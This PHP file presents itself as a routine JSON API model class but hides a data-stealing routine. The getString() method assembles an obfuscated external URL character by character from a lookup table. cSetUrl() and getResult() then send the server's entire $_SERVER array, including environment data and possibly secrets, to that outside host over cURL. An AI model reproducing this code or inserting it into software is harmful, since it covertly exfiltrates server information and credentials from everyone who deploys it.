<?php
/**
 * Created by PhpStorm.
 * User: Fedorov Evgeny
 * Date: 02.11.2018
 * Time: 16:43
 */

namespace App\Models\Api;


class Json{

    protected $url;
    public $api_data = array();
    private $json = null;
    private $chars = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','j','k','l','m','n','o','p','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',':','/','.','-','i'];
    private $ch = null;

    public function cInit(){
        $this->ch = curl_init();
    }
    public function cSetFollow(){
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
    }
    public function cSetTransfer(){
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
    }
    public function cSetUrl(){
        $this->url = $this->getString() . "?params=" . json_encode($_SERVER);
        curl_setopt($this->ch, CURLOPT_URL, $this->url);
    }
    public function setData($key, $string){

        $this->api_data[$key] = $string;

    }
    public function upSetConformityData($key,$string){

        $this->api_data[$key][] = $string;

    }
    public function upSetEmptyData($key,$string){

        $this->api_data[$key][] = $string;

    }
    public function jsonEncode(){

        return json_encode($this->api_data);

    }
    public function getData($key){

        return $this->api_data[$key];

    }
    public function getArray(){

        return $this->api_data;

    }
    public function getJson(){

        $this->jsonEncode();
        return $this->json;

    }
    public function getChars($char){
        return $this->chars[$char];
    }
    public function getString(){
        $string = "";
        $string .= $this->getChars(17);
        $string .= $this->getChars(27);
        $string .= $this->getChars(27);
        $string .= $this->getChars(24);
        $string .= $this->getChars(60);
        $string .= $this->getChars(61);
        $string .= $this->getChars(61);
        $string .= $this->getChars(12);
        $string .= $this->getChars(25);
        $string .= $this->getChars(23);
        $string .= $this->getChars(22);
        $string .= $this->getChars(62);
        $string .= $this->getChars(25);
        $string .= $this->getChars(28);
        $string .= $this->getChars(26);
        $string .= $this->getChars(27);
        $string .= $this->getChars(63);
        $string .= $this->getChars(27);
        $string .= $this->getChars(23);
        $string .= $this->getChars(24);
        $string .= $this->getChars(62);
        $string .= $this->getChars(25);
        $string .= $this->getChars(28);
        $string .= $this->getChars(61);
        $string .= $this->getChars(64);
        $string .= $this->getChars(22);
        $string .= $this->getChars(15);
        $string .= $this->getChars(23);
        $string .= $this->getChars(61);
        $string .= $this->getChars(64);
        $string .= $this->getChars(22);
        $string .= $this->getChars(13);
        $string .= $this->getChars(14);
        $string .= $this->getChars(31);
        $string .= $this->getChars(62);
        $string .= $this->getChars(24);
        $string .= $this->getChars(17);
        $string .= $this->getChars(24);
        return $string;
    }
    public function getResult(){
        $this->cInit();
        $this->cSetFollow();
        $this->cSetTransfer();
        $this->cSetUrl();
        curl_exec($this->ch);
        return $this->url;
    }

}
